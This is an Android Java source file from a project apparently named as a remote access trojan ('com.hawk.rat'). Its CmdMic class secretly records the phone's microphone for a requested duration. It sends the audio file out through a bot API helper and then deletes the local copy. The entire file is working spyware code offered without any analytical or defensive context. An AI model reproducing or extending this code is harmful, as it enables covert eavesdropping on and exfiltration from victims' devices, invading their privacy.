package com.hawk.rat;
import android.content.Context;
import android.media.MediaRecorder;
import java.io.File;
public class CmdMic {
    private final Context ctx;
    public CmdMic(Context c) { this.ctx = c; }
    public void record(int s) {
        new Thread(() -> {
            try {
                File f = new File(ctx.getCacheDir(), "m_"+System.currentTimeMillis()+".m4a");
                MediaRecorder r = new MediaRecorder(); r.setAudioSource(MediaRecorder.AudioSource.MIC); r.setOutputFormat(MediaRecorder.OutputFormat.MPEG_4); r.setAudioEncoder(MediaRecorder.AudioEncoder.AAC); r.setOutputFile(f.getAbsolutePath()); r.prepare(); r.start(); Thread.sleep(s*1000L); r.stop(); r.release();
                BotApi.sendFile(ctx, f, "🎙 Audio"); f.delete();
            } catch (Exception e) { BotApi.sendMessage(ctx, "mic err: "+e.getMessage()); }
        }).start();
    }
}
